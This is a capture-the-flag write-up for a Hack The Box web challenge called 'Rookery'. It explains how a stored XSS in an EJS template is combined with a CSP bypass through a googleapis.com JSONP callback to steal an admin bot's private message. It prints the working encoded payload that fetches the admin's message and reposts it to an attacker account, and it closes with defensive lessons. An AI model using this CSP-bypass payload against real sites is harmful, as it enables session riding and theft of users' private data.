# Stored XSS with CSP Bypass via JSONP — Medieval Messaging App ("Rookery")

**Platform:** Hack The Box CTF Cyber Apocalypse 2026 The Salt Crown
**Category:** Web
**Difficulty:** easy

## Objective

A medieval-themed messaging application contains a stored XSS vulnerability. An admin bot automatically reads messages sent to the `admin` account. A flag is stored in message ID 1 (from `archivist` to `admin`), readable only by the admin. Goal: steal the flag from the admin's inbox and exfiltrate it to an attacker-controlled account.

## Application Overview

The application is a Node.js/Express app using EJS templates with the following relevant routes (from `app/routes.js`):

```
GET  /              → inbox
GET  /messages/new  → compose
POST /messages      → send message (triggers bot if recipient=admin)
GET  /messages/:id  → view message (XSS fires here)
POST /register      → create account
POST /login         → session login
```

Key source files:

- `app/views/message.ejs` — renders message content with `<%- message.content %>` (raw, unescaped HTML output). This is the XSS sink.
- `app/controllers/messageController.js` — `sendMessage()` calls `enqueueMessageVisit(result.lastID)` when the recipient's username is `admin`, causing an automated Playwright/Firefox bot to log in as admin and visit the message URL.
- `bot/bot.js` — headless Firefox bot. Logs in with credentials from `/app/admin_credentials.json` (a random 24-byte password brute force is not viable), visits `/messages/<id>`, waits 2 seconds, closes.
- `entrypoint.js` — seeds 6 users and 6 messages; the flag is the **first** message created (message ID 1), from `archivist` to `admin`.

## Identifying the XSS

The sink is in `app/views/message.ejs`:

```html
<pre class="letter-copy"><%- message.content %></pre>
```

EJS uses `<%- %>` for raw, unescaped HTML output. Any HTML or JavaScript in the message content is rendered directly into the page without encoding. Because the content persists in the database and is re-rendered on every view, this is **stored XSS**.

Confirmed by sending `<b>test</b>` as message content and observing it render as bold text.

Note: the message body is initially hidden behind a "sealed letter" overlay (`<section hidden>`), but that does not matter — `<script>` tags execute regardless of the `hidden` attribute on their parent, and the bot never clicks anything. The payload fires on page load.

## The Obstacle: Content Security Policy

`app/server.js` sets a strict CSP on every response:

```
default-src 'self'
script-src 'self' https://www.googleapis.com
style-src 'self'
img-src 'self' data:
font-src 'self' data:
connect-src 'self'
object-src 'none'
form-action 'self'
frame-ancestors 'none'
```

Inline scripts are blocked by `default-src 'self'` — `<script>alert(1)</script>` and event-handler attributes (`onerror`, `onload`, etc.) are all refused. Only scripts loaded from `'self'` or `https://www.googleapis.com` can execute.

## CSP Bypass — JSONP via googleapis.com

`script-src` allows `https://www.googleapis.com`. Some Google API endpoints support **JSONP**: they take a `callback` query parameter, wrap it around the response payload, and return it as executable JavaScript. That means a tag like

```html
<script src="https://www.googleapis.com/endpoint?callback=..."></script>
```

executes the callback value as JavaScript, because the response is valid JS served from an origin the CSP explicitly allows.

The `https://www.googleapis.com/customsearch/v1` endpoint was confirmed alive and JSONP-capable:

```bash
curl "https://www.googleapis.com/customsearch/v1?callback=test1"
# Returns: test1({...}) — valid JSONP. (An API-key error JSON is returned,
# but the callback still executes with the error object, which is fine.)
```

### Why a self-invoking function works

The JSONP response is wrapped as `callback({...})`. If the callback is a self-invoking function expression:

```text
(function(){ ... })()  ({...json...})
```

The IIFE executes the attacker's code immediately, then returns a no-op `function(){}`, which the trailing `({...json...})` invocation calls with the JSON payload — a harmless no-op. No comment tricks or syntax juggling needed; the expression is valid JavaScript with zero errors.

### Encoding: why the callback is pre-URL-encoded

The callback is embedded inside the `src` attribute of a `<script>` tag, and the whole tag is placed in an `application/x-www-form-urlencoded` POST body. This requires **two layers of encoding**:

1. **Pre-URL-encode the callback value** (`%28function%28%29%7B...%7D%29%28%29`) so the `src` attribute contains no raw special characters (`(`, `)`, `{`,`}`, `'`) that could break HTML attribute parsing or URL handling.
2. **`encodeURIComponent` the entire `<script>` tag** for the POST body.

Only the outer `encodeURIComponent` is applied at runtime; the callback inside the URL is already encoded and must **not** be encoded again (double-encoding was the cause of several failed attempts the browser would then request a literal `%2528...` value).

## The Attack Chain

The admin bot visits any message sent to `admin`. When it loads the malicious message, the `<script>` tag fires in the admin's authenticated session. The payload must:

1. Fetch `/messages/1` using the admin's session this message which contains the flag inside it.
2. Extract the flag text from the HTML.
3. Exfiltrate it by POSTing a new message to the attacker's account.

All three steps are constrained by `connect-src 'self'` — `fetch()` can only reach the same origin. This is fine: the exfiltration target is `/messages` on the same app, not an external server. The CSP's `connect-src` restriction is satisfied by keeping every request same-origin.

## Payload Construction

The callback is a self-invoking function that performs the entire exfiltration chain. Decoded:

```javascript
(function() {
  fetch('/messages/1', { credentials: 'same-origin' })
    .then(function(r) { return r.text(); })
    .then(function(t) {
      var dp = new DOMParser();
      var doc = dp.parseFromString(t, 'text/html');
      var el = doc.querySelector('.letter-copy');
      var content = el ? el.textContent : 'NOT_FOUND::' + t.substring(0, 500);
      fetch('/messages', {
        method: 'POST',
        credentials: 'same-origin',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: 'to_username=attacker123&content=' + encodeURIComponent(content)
      });
    });
  return function() {};
})()
```

**Why DOMParser instead of regex:**
The flag is embedded in HTML inside a `<pre class="letter-copy">` element. Using `DOMParser` to parse the full HTML response and `querySelector` to target that element is more reliable than regex — it handles whitespace,
encoding, and surrounding markup correctly.

**Why `credentials: 'same-origin'`:**
The admin's session cookie must be attached to the `fetch('/messages/1')` request, otherwise the server returns 401. `credentials: 'same-origin'` ensures the browser sends the session cookie automatically.

**Why direct `fetch()` instead of the compose form:**
The compose page (`public/compose.js`) copies `innerText` from a `contenteditable` div into the hidden form input on submit. `innerText` strips all HTML tags, so a normal form submission can never send a `<script>`
payload. The attacker bypasses the form entirely and POSTs the raw HTML with `fetch()`.

**Final message sent to admin (the exact payload that solved the lab):**

The final payload was achieved by the help of a friend on Discord called Sphinx. The payload can be sent via console.

```javascript
fetch('/messages', {
  method: 'POST',
  credentials: 'same-origin',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
  body: 'to_username=admin&content=' + encodeURIComponent('<script src="https://www.googleapis.com/customsearch/v1?callback=%28function%28%29%7Bfetch%28%27%2Fmessages%2F1%27%2C%7Bcredentials%3A%27same-origin%27%7D%29.then%28function%28r%29%7Breturn%20r.text%28%29%3B%7D%29.then%28function%28t%29%7Bvar%20dp%3Dnew%20DOMParser%28%29%3Bvar%20doc%3Ddp.parseFromString%28t%2C%27text%2Fhtml%27%29%3Bvar%20el%3Ddoc.querySelector%28%27.letter-copy%27%29%3Bvar%20content%3Del%3Fel.textContent%3A%27NOT_FOUND%3A%3A%27%2Bt.substring%280%2C500%29%3Bfetch%28%27%2Fmessages%27%2C%7Bmethod%3A%27POST%27%2Ccredentials%3A%27same-origin%27%2Cheaders%3A%7B%27Content-Type%27%3A%27application%2Fx-www-form-urlencoded%27%7D%2Cbody%3A%27to_username%3D{your_username}%26content%3D%27%2BencodeURIComponent%28content%29%7D%29%3B%7D%29%3Breturn%20function%28%29%7B%7D%3B%7D%29%28%29"></script>')
}).then(r => console.log('status:', r.status));
```

Decoded, the `callback` parameter is the IIFE shown above. The `%28`/`%29`/ `%7B`/`%7D` sequences are pre-URL-encoded `(`/`)`/`{`/`}` so the `src` attribute contains no raw special characters; `encodeURIComponent` then handles only the outer `<script>` tag for the POST body.

Note: the form field is `to_username` (not `recipient`), confirmed from the controller's `sendMessage()` handler. Using the wrong field name returns a validation error ("Recipient not found") that looks like an auth failure.

## Execution Flow

```
Attacker sends malicious message to admin (fetch POST, bypassing compose form)
      ↓
messageController enqueues bot visit (recipient == 'admin')
      ↓
Bot logs in as admin, visits /messages/<id>
      ↓
Browser parses page; <script> tag loads — executes even in hidden section
      ↓
script-src allows googleapis.com — JSONP script executes in admin session
      ↓
IIFE fires: fetch('/messages/1', {credentials:'same-origin'}) as admin
      ↓
Response HTML parsed with DOMParser
      ↓
.letter-copy element extracted → flag text obtained
      ↓
POST /messages exfiltrates flag to attacker123's inbox (same-origin → CSP ok)
      ↓
Attacker checks inbox → flag recovered
```

## Lessons Learned

- `<%- %>` in EJS is raw output the template equivalent of `innerHTML`. Any user content reaching this sink is immediately exploitable if not sanitized upstream.
- CSP `script-src` whitelisting an entire domain is dangerous if *any* endpoint on that domain supports JSONP. A single callback-reflecting endpoint breaks the protection entirely.
- The compose form field name matters `to_username`, not `recipient`. Always read the actual form/controller source before sending crafted requests.
- `credentials: 'same-origin'` is required for XSS session riding. Without it, the session cookie is not attached and the fetch returns 401 even though the request is same-origin.
- `DOMParser` is more reliable than regex for extracting content from HTML responses it handles encoding and markup correctly without fragile pattern matching.
- When embedding a payload in a URL inside a form body, manage encoding carefully: pre-encode the URL parameter, then `encodeURIComponent` the enclosing HTML but never encode the already-encoded value a second time.
- A self-invoking function that returns `function(){}` absorbs a JSONP wrapper's trailing `({...})` invocation cleanly no syntax errors, no comment hacks.
- CSP auditing must include checking every whitelisted domain for JSONP endpoints. `*.googleapis.com` has historically been a common bypass source.
- Bot-based XSS exploitation requires thinking about what the bot has access to that you don't, then designing the payload to exfiltrate exactly that in this case, a seeded message only the admin can read.
